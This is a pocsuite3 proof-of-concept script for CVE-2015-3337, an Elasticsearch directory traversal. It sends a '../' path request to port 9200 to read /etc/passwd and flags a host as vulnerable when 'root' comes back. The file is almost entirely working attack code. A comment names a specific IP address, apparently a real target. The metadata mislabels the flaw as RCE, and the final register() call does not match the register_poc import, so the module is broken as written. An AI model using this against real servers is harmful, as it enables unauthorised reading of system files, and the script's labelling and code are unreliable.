#!/usr/bin/python
# -*- coding: utf-8 -*-
import re
# from pocsuite.poc import POCBase, Output
# from pocsuite.utils import register
#application/x-www-form-urlencoded  149.210.146.254:9200
#https://www.cnblogs.com/mrhonest/p/11349741.html
from pocsuite3.api import requests as req  # 用法和 requests 完全相同
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase

# import requests
headers = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0', 'content-type': 'application/json'}

#/_plugin/head/../../../../../../../../../../../etc/passwd
def poc(url):
    a=False
    url=str(url)[7:]
    url="http://"+url+":9200/_plugin/../../../../../../../../../../../etc/passwd"
    try:
        res = req.get(url, verify=False, timeout=10, headers=headers)
        response = res.text
        if res.status_code==200 and "root" in response:
            a=True
    except Exception:
        response = ""
    return a


class TestPOC(POCBase):
    name = 'liunx_cve-2015-3337'
    vulID = 'CVE-2015-3337'
    author = ['weihong','mfz']
    vulType = 'RCE'
    version = '1.1'  # default version: 1.0
    references = ['']
    desc = '''
            Elasticsearch是荷兰Elasticsearch公司的一套基于Lucene构建的开源分布式RESTful搜索引擎，它主要用于云计算中，并支持通过HTTP使用JSON进行数据索引。
            Elasticsearch1.4.5之前版本和1.5.2之前1.5.x版本中存在目录遍历漏洞。
            当程序启用site插件时，远程攻击者可利用该漏洞读取任意文件。 
		   '''
    vulDate = '2015-05-01'
    createDate = '2020-03-27'
    updateDate = '2020-03-27'
    appName = 'Liunx ElasticSearch'
    appVersion = 'Liunx ElasticSearch < 1.4.5 /< 1.5.2'
    appPowerLink = ''
    samples = ['']

    def _attack(self):
        '''attack mode'''
        return self._verify()

    def _verify(self):
        '''verify mode'''
        result = {}
        aa = poc(self.url)
        if aa:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['IP'] = str(self.url)[7:] + ' Liunx_cve-2015-3337' + ' is exist!'
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output

register(TestPOC)
